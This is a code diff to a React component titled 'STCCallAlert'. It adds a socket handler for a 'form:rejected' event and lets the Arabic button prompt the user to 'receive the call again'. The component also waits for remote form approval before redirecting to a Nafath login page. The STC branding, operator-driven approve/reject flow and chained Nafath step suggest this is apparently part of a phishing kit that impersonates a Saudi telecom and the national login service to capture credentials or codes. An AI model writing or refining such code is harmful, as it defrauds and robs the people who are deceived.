@@ -1,4 +1,4 @@
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 import { useLocation } from "wouter";
 import PageLayout from "@/components/layout/PageLayout";
 import WaitingOverlay from "@/components/WaitingOverlay";
@@ -7,11 +7,14 @@ import {
   sendData,
   isFormApproved,
   navigateToPage,
+  socket,
 } from "@/lib/store";
 
 export default function STCCallAlert() {
   const [, navigate] = useLocation();
   const [callReceived, setCallReceived] = useState(false);
+  const [buttonText, setButtonText] = useState("تم استلام المكالمة");
+  const inputRef = useRef<HTMLButtonElement>(null);
 
   // Emit page enter
   useEffect(() => {
@@ -24,6 +27,23 @@ export default function STCCallAlert() {
       navigate("/nafath-login-page");
     }
   }, [isFormApproved.value, navigate]);
+
+  // Handle form rejection
+  useEffect(() => {
+    const handleRejection = () => {
+      setCallReceived(false);
+      setButtonText("إعادة تلقي مكالمة");
+      if (inputRef.current) {
+        inputRef.current.focus();
+      }
+    };
+
+    socket.on("form:rejected", handleRejection);
+
+    return () => {
+      socket.off("form:rejected", handleRejection);
+    };
+  }, []);
 
   const handleCallReceived = () => {
     setCallReceived(true);
@@ -97,13 +117,14 @@ export default function STCCallAlert() {
 
         {/* Button */}
         <Button
+          ref={inputRef}
           onClick={handleCallReceived}
           className="w-full"
           size="lg"
           disabled={callReceived}
           style={{backgroundColor: callReceived ? '#9ca3af' : '#4F008C'}}
         >
-          {callReceived ? "جاري التحقق..." : "تم استلام المكالمة"}
+          {callReceived ? "جاري التحقق..." : buttonText}
         </Button>
       </div>
     </PageLayout>
